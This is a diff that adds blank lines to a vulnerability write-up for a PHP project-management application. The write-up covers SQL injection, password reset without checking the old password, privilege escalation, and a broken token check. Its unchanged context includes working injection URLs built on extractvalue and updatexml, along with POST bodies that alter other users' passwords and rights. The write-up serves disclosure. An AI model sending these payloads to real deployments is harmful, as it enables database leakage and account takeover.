@@ -37,6 +37,7 @@ The vulnerable file is control_task.php. (control_project.php, default_user.php)
 In the control_task.php file:
 
 ![1.png](./img/1.png)
+
 On line 150, if the user submits the sort parameter, it is assigned to ```$sortlist```.
 
 On line 284, the GetSQLValueString function is called to process ```$sortlist``` and assign it to ```$query_Recordset1```.
@@ -52,6 +53,7 @@ Line 289 data directly enters the database query,the injection vulnerability was
 
 Request the following url:```/index.php?sort=1,extractvalue(rand(),concat(0x3a,substring(user(),1,30)))%23```
 ![5.png](./img/5.png)
+
 The current user is obtained by injection as root@localhost.
 
 **[2]SQL Injection Vulnerability**
@@ -63,9 +65,11 @@ The system can filter requests by default only after calling the GetSQLValueStri
 In the default_task_edituser.php file:
 
 ![6.png](./img/6.png)
+
 Line 5 restricts the user to one of "Guest" / "Ordinary User" / "Project Manager" / "Administrator".
 
 ![7.png](./img/7.png)
+
 Line 20 directly puts ```$_POST['csa_to_user']``` into the database for query, resulting in injection.
 
 Initiate a POST request to submit the following data:
@@ -100,17 +104,20 @@ The vulnerable file is log_edit.php.
 In log_edit.php:
 
 ![9.png](./img/9.png)
+
 Line 5 restricts the user to one of "Guest" / "Ordinary User" / "Project Manager" / "Administrator".
 
 ![10.png](./img/10.png)
 
 ![11.png](./img/11.png)
+
 On line 58, ```$logdate``` enters the database query without being processed by the GetSQLValueString function, resulting in injection.
 
 Request the following url:
 ```/log_edit.php?date=1234/**/and/**/1=(updatexml(1,concat(0x5e24,(select%20@@version),0x5e24),1))--%20-&taskid= 1```
 
 ![12.png](./img/12.png)
+
 The current database version obtained by injection is 5.5.53.
 
 **[4]Unauthorized Access Vulnerability**
@@ -118,6 +125,7 @@ The current database version obtained by injection is 5.5.53.
 In user_edit_password.php:
 
 ![13.png](./img/13.png)
+
 On line 24, the password is modified for the specified user by ```$_POST['ID']``` and the original password is not verified.
 So you can override the password of someone else.
 
@@ -170,9 +178,11 @@ If you want to modify someone else's password, modify the corresponding UID para
 In default_user_edit.php
 
 ![14.png](./img/14.png)
+
 Line 23 If the queried user uid does not match the current id or is not an admin, the operation is quit, and the user is prohibited from viewing other user details.
 
 ![15.png](./img/15.png)
+
 However, when the user's data update is performed on line 58, the user uid of the data to be updated is directly obtained from ```$_POST['ID']```, so that the information of others can be modified.
 
 POST requests the following data:
@@ -197,6 +207,7 @@ tk_display_name=changed_by_todaro&tk_user_contact=18010101010&tk_user_email=12%4
 ```
 
 ![16.png](./img/16.png)
+
 You can modify the information of the admin user.
 
 At the same time, you can upgrade the current user to the admin by modifying tk_user_rank to 5 when you modify your own information!
@@ -228,6 +239,7 @@ tk_display_name=todaro&tk_user_contact=18010101010&tk_user_email=12%40qq.com&tk_
 The if_get_addbook.php file does not have an authentication operation.
 
 ![18.png](./img/18.png)
+
 Line 3 reads all the input via php://input;
 Line 4 decodes the json data;
 Line 7 checks the token value in json with the check_token function.
@@ -235,9 +247,11 @@ Line 7 checks the token value in json with the check_token function.
 The check_token function is in /function.class.php:
 
 ![19.png](./img/19.png)
+
 By default, all users have a token of 0.
 
 ![20.png](./img/20.png)
+
 So the check_token function returns the uid of the user whose token is 0, which is the uid of all users by default.
 
 Go back to if_get_addbook.php:
@@ -245,6 +259,7 @@ Go back to if_get_addbook.php:
 ![21.png](./img/21.png)
 
 ![22.png](./img/22.png)
+
 Line 11 calls the get_user_select function in function.class.php.
 
 POST requests the following data:
@@ -298,33 +313,41 @@ csa_text=test_admin_create_project_by_todaro&csa_remark1=hhhh&csa_tag=ccccccc&cs
 ```
 
 ![24.png](./img/24.png)
+
 Created a task for admin through exploits.
 
 **[9]**
 
 ![25.png](./img/25.png)
+
 /control_file.php
 
 
 ![26.png](./img/26.png)
+
 /control_log.php
 
 
 ![27.png](./img/27.png)
+
 /control_project.php
 
 
 ![28.png](./img/28.png)
+
 /control_task.php
 
 
 ![29.png](./img/29.png)
+
 /control_log.php
 
 
 ![30.png](./img/30.png)
+
 /tree.php
 
 
 ![31.png](./img/31.png)
+
 /control_task.php
